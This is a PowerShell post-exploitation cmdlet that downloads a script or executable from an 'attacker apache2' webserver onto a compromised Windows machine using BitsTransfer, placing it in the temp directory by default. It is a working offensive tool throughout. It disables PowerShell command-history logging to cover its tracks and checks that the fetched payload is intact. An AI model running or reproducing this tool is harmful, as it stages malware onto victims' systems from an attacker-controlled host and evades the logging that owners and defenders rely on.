<#
.SYNOPSIS
   Download Files from Attacker Apache2 (BitsTransfer)

   Author: r00t-3xp10it
   Tested Under: Windows 10 (18363) x64 bits
   Required Dependencies: none
   Optional Dependencies: BitsTransfer
   PS cmdlet Dev version: v1.0.1

.NOTES
   Required Dependencies: BitsTransfer {native}
   File to Download must be stored in attacker apache2 webroot.
   -Upload and -ApacheAddr Are Mandatory parameters (required).
   -Destination parameter its auto set to $Env:TMP by default.

.Parameter Upload
   Accepts the file name to upload (default path: apache2 webroot)

.Parameter ApacheAddr
   Accepts the attacker apache2 webserver ip adrress

.Parameter Destination
   Accepts the absoluct \ relative path of file on target system

.EXAMPLE
   PS C:\> .\Upload.ps1 -Upload FileName.ps1 -ApacheAddr 192.168.1.73 -Destination $Env:TMP\FileName.ps1
   Downloads FileName.ps1 script from attacker apache2 (192.168.1.73) into $Env:TMP\FileName.ps1 Local directory
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Upload="false",
   [string]$ApacheAddr="false",
   [string]$Destination="false"
)


Write-Host ""
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
If($Upload -ne "false"){

    ## Make sure we have all parameters required
    If($ApacheAddr -ieq "false" -or $ApacheAddr -ieq $null){## Mandatory parameter
        Write-Host "[error]: -ApacheAddr Mandatory Parameter Required!" -ForegroundColor Red -BackgroundColor Black
        Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @Upload
    }
    If($Destination -ieq "false" -or $Destination -ieq $null){## [ -Destination ] parameter $null
        $Destination = "$Env:TMP\$Upload" ## NOT Mandatory parameter => Default: $Env:TMP
    }

    Write-Host "[+] Uploading $Upload to $Destination" -ForeGroundColor Green;Start-Sleep -Seconds 1
    If($ApacheAddr -Match '127.0.0.1'){## Localhost connections are NOT supported by this module
        Write-Host "[abort] 127.0.0.1 (localhost) connections are not supported!" -ForeGroundColor Red -BackGroundColor Black
        Write-Host "";Start-Sleep -Seconds 1;exit ## exit @Upload
    }

    ## Download file using BitsTransfer
    Write-Host "[i] Trying to Download $Upload from $ApacheAddr Using BitsTransfer (BITS)" -ForeGroundColor Yellow      
    Start-BitsTransfer -priority foreground -Source http://$ApacheAddr/$Upload -Destination $Destination -ErrorAction SilentlyContinue|Out-Null   
    If(-not($LASTEXITCODE -eq 0)){Write-Host "[fail] to download $Upload using BitsTransfer service!" -ForeGroundColor Red -BackgroundColor Black;Start-Sleep -Seconds 1}

    ## Make sure that file was successfuly downloaded
    If(-not([System.IO.File]::Exists("$Destination")) -or $Upload -ieq $null -or $Destination -ieq $null){
        Write-Host "`n[error]: BitsTransfer: Something went wrong with the download process!" -ForegroundColor Red -BackgroundColor Black
        Write-Host "";Start-Sleep -Seconds 1;exit ## exit @Upload  
    }

    ## Check for downloaded file (script) integrity
    If(-not($Upload -iMatch '[.exe]$')){## This test does not work on binary files (.exe)
        $Status = Get-Content -Path "$Destination" -EA SilentlyContinue
        If($Status -iMatch '^(<!DOCTYPE html)'){
            Write-Host "[abort] $Upload Download Corrupted (DOCTYPE html)" -ForeGroundColor Red -BackGroundColor Black
            Write-Host "";Start-Sleep -Seconds 1;exit ## exit @Upload
        }ElseIf($Status -iMatch '^(404)'){
            Write-Host "[abort] $Upload Not found in Remote Server (404)" -ForeGroundColor Red -BackGroundColor Black
            Write-Host "";Start-Sleep -Seconds 1;exit ## exit @Upload
        }ElseIf($Status -ieq $Null){
            Write-Host "[abort] $Upload `$null Content Detected (corrupted)" -ForeGroundColor Red -BackGroundColor Black
            Write-Host "";Start-Sleep -Seconds 1;exit ## exit @Upload
        }Else{
            ## File (script) successfuly Downloaded
            $Success = $True
        }
    }

    <#
    .NOTES
       This next function only accepts Binary.exe until 80/KB of File Size
       If you wish to increase the Size Limmit then modifie the follow line:
       If($SizeDump -lt 80){## Make sure BitsTransfer download => is NOT corrupted
    #>

    ## Check for downloaded Binary (exe) integrity
    If($Upload -iMatch '[.exe]$'){## Binary file download detected
        $SizeDump = ((Get-Item "$Destination" -EA SilentlyContinue).length/1KB)
        If($SizeDump -lt 80){## Make sure BitsTransfer download => is NOT corrupted
            Write-Host "[abort] $Upload Length: $SizeDump/KB Integrity Corrupted" -ForeGroundColor Red -BackGroundColor Black
            Write-Host "[error] If you wish to increase the File Size Limmit, then manual"
            Write-Host "[error] edit this CmdLet and modifie line[1532]: If(`$SizeDump -lt 80){"
            Write-Host "";Start-Sleep -Seconds 1;exit ## exit @Upload
         }
    }

    ## Build Object-Table Display
    If(Test-Path -Path "$Destination"){
        Get-ChildItem -Path "$Destination" -EA SilentlyContinue|
        Select-Object Directory,Name,Exists,CreationTime > $Env:TMP\Upload.log
        Get-Content -Path "$Env:TMP\Upload.log"
        Remove-Item "$Env:TMP\Upload.log" -Force
    }
    Write-Host "";Start-Sleep -Seconds 1
}